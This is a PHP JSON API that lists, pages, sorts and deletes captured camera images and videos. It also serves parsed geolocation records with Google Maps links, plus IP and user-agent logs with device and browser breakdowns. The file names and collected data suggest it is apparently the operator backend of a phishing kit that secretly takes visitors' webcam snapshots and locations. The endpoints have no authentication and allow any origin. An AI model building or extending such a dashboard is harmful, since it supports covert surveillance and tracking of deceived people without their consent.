<?php
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, DELETE, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') exit;

$method = $_SERVER['REQUEST_METHOD'];
$capturesDir = '/data/captures';
$locationsDir = '/data/locations';
$logsDir = '/data/logs';

function safeScan($dir, $pattern) {
    if (!is_dir($dir)) return [];
    $results = [];
    foreach (scandir($dir, SCANDIR_SORT_DESCENDING) as $f) {
        if ($f === '.' || $f === '..') continue;
        if (preg_match($pattern, $f)) $results[] = $f;
    }
    return $results;
}

function parseIpLog($file) {
    if (!file_exists($file)) return [];
    $entries = [];
    foreach (file($file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES) as $line) {
        if (preg_match('/\[(.+?)\]\s*IP:\s*(.+?)\s*\|\s*UA:\s*(.+)/', $line, $m)) {
            $ua = trim($m[3]);
            $device = 'Unknown'; $browser = 'Unknown'; $os = 'Unknown';
            if (preg_match('/Mobile|Android|iPhone/i', $ua)) $device = 'Mobile';
            elseif (preg_match('/Tablet|iPad/i', $ua)) $device = 'Tablet';
            elseif (preg_match('/Windows|Macintosh|Linux/i', $ua)) $device = 'Desktop';
            if (preg_match('/Chrome\/[\d.]+/', $ua)) $browser = 'Chrome';
            elseif (preg_match('/Firefox\/[\d.]+/', $ua)) $browser = 'Firefox';
            elseif (preg_match('/Safari\/[\d.]+/', $ua) && !preg_match('/Chrome/', $ua)) $browser = 'Safari';
            elseif (preg_match('/Edge\/[\d.]+/', $ua)) $browser = 'Edge';
            if (preg_match('/Windows NT/', $ua)) $os = 'Windows';
            elseif (preg_match('/Mac OS X/', $ua)) $os = 'macOS';
            elseif (preg_match('/Android/', $ua)) $os = 'Android';
            elseif (preg_match('/iPhone|iPad|iOS/', $ua)) $os = 'iOS';
            elseif (preg_match('/Linux/', $ua)) $os = 'Linux';
            $entries[] = [
                'timestamp' => $m[1], 'ip' => trim($m[2]), 'ua' => $ua,
                'device' => $device, 'browser' => $browser, 'os' => $os,
                'short_ua' => $browser . ' on ' . $os
            ];
        }
    }
    return $entries;
}

function parseLocation($file) {
    $content = file_get_contents($file);
    $lat = $lon = $acc = $maps = '';
    if (preg_match('/Latitude:\s*([^\r\n]+)/', $content, $m)) $lat = trim($m[1]);
    if (preg_match('/Longitude:\s*([^\r\n]+)/', $content, $m)) $lon = trim($m[1]);
    if (preg_match('/Accuracy:\s*([^\r\n]+)/', $content, $m)) $acc = trim($m[1]);
    if (preg_match('/Google Maps:\s*([^\r\n]+)/', $content, $m)) $maps = trim($m[1]);
    return ['lat' => $lat, 'lon' => $lon, 'accuracy' => $acc, 'maps' => $maps];
}

if ($method === 'GET') {
    $action = $_GET['action'] ?? 'all';

    if ($action === 'captures') {
        $files = safeScan($capturesDir, '/\.(png|webm)$/i');
        $page = max(1, (int)($_GET['page'] ?? 1));
        $perPage = min(100, max(1, (int)($_GET['per_page'] ?? 24)));
        $search = $_GET['search'] ?? '';
        $sort = $_GET['sort'] ?? 'newest';
        $total = count($files);

        if ($search) {
            $files = array_values(array_filter($files, function($f) use ($search) {
                return stripos($f, $search) !== false;
            }));
        }

        if ($sort === 'oldest') $files = array_reverse($files);
        elseif ($sort === 'largest') {
            usort($files, function($a, $b) use ($capturesDir) {
                return filesize("$capturesDir/$b") - filesize("$capturesDir/$a");
            });
        } elseif ($sort === 'smallest') {
            usort($files, function($a, $b) use ($capturesDir) {
                return filesize("$capturesDir/$a") - filesize("$capturesDir/$b");
            });
        }

        $offset = ($page - 1) * $perPage;
        $pageFiles = array_slice($files, $offset, $perPage);
        $captures = [];
        foreach ($pageFiles as $f) {
            $path = "$capturesDir/$f";
            $captures[] = [
                'name' => $f,
                'size' => filesize($path),
                'time' => filemtime($path),
                'type' => preg_match('/\.webm$/i', $f) ? 'video' : 'image',
                'url' => '/api/capture?file=' . urlencode($f),
                'thumb' => '/api/capture?file=' . urlencode($f) . '&thumb=1',
            ];
        }
        echo json_encode([
            'captures' => $captures,
            'total' => $total,
            'filtered' => count($files),
            'page' => $page,
            'per_page' => $perPage,
            'pages' => ceil(count($files) / $perPage),
        ]);
        exit;
    }

    if ($action === 'locations') {
        $files = safeScan($locationsDir, '/^location_.*\.txt$/i');
        $locations = [];
        foreach ($files as $f) {
            $loc = parseLocation("$locationsDir/$f");
            $loc['name'] = $f;
            $loc['time'] = filemtime("$locationsDir/$f");
            $locations[] = $loc;
        }
        echo json_encode(['locations' => $locations, 'total' => count($locations)]);
        exit;
    }

    if ($action === 'ips') {
        $entries = parseIpLog("$logsDir/saved.ip.txt");
        $uniqueIps = array_unique(array_column($entries, 'ip'));
        $deviceCounts = array_count_values(array_column($entries, 'device'));
        $browserCounts = array_count_values(array_column($entries, 'browser'));
        $osCounts = array_count_values(array_column($entries, 'os'));
        echo json_encode([
            'entries' => $entries,
            'total' => count($entries),
            'unique_ips' => count($uniqueIps),
            'device_breakdown' => $deviceCounts,
            'browser_breakdown' => $browserCounts,
            'os_breakdown' => $osCounts,
        ]);
        exit;
    }

    if ($action === 'stats') {
        $capFiles = safeScan($capturesDir, '/\.(png|webm)$/i');
        $locFiles = safeScan($locationsDir, '/^location_.*\.txt$/i');
        $ipEntries = parseIpLog("$logsDir/saved.ip.txt");
        $totalSize = 0;
        foreach ($capFiles as $f) $totalSize += filesize("$capturesDir/$f");
        $uniqueIps = array_unique(array_column($ipEntries, 'ip'));
        $firstCapture = null; $lastCapture = null;
        if (!empty($capFiles)) {
            $times = array_map(function($f) use ($capturesDir) { return filemtime("$capturesDir/$f"); }, $capFiles);
            $firstCapture = min($times); $lastCapture = max($times);
        }
        echo json_encode([
            'total_captures' => count($capFiles),
            'total_locations' => count($locFiles),
            'total_ips' => count($ipEntries),
            'unique_ips' => count($uniqueIps),
            'total_size_bytes' => $totalSize,
            'total_size_mb' => round($totalSize / 1048576, 2),
            'first_capture' => $firstCapture,
            'last_capture' => $lastCapture,
            'server_time' => time(),
        ]);
        exit;
    }

    echo json_encode(['error' => 'Unknown action']);
    exit;
}

if ($method === 'DELETE') {
    $input = json_decode(file_get_contents('php://input'), true) ?? [];
    $file = $input['file'] ?? '';
    if (!preg_match('/^[\w.-]+\.(png|webm)$/i', $file)) {
        http_response_code(400);
        echo json_encode(['error' => 'Invalid filename']);
        exit;
    }
    $path = "$capturesDir/" . basename($file);
    if (file_exists($path)) {
        unlink($path);
        echo json_encode(['status' => 'deleted']);
    } else {
        http_response_code(404);
        echo json_encode(['error' => 'File not found']);
    }
    exit;
}

http_response_code(405);
echo json_encode(['error' => 'Method not allowed']);
